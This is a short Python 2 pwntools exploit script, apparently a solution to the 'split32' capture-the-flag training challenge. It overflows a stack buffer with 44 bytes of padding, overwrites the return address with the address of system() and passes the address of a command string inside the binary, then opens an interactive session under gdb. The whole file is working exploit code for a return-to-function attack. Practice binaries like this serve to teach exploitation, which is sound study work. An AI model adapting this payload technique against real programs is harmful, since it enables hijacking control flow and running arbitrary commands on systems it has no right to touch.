from pwn import *
import struct

BINCAT     = p32(0x804a030)
SYSTEM     = p32(0x8048430)
junk       = "A"*44

gdb_cmd = [
    "b *0x08048648",
    "c"
        ]

r = process('./split32')

gdb.attach(r, gdbscript = "\n".join(gdb_cmd))

def pwn():
    payload = junk + SYSTEM + "MRET" + BINCAT
    print r.recvuntil('> ')
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    pwn()
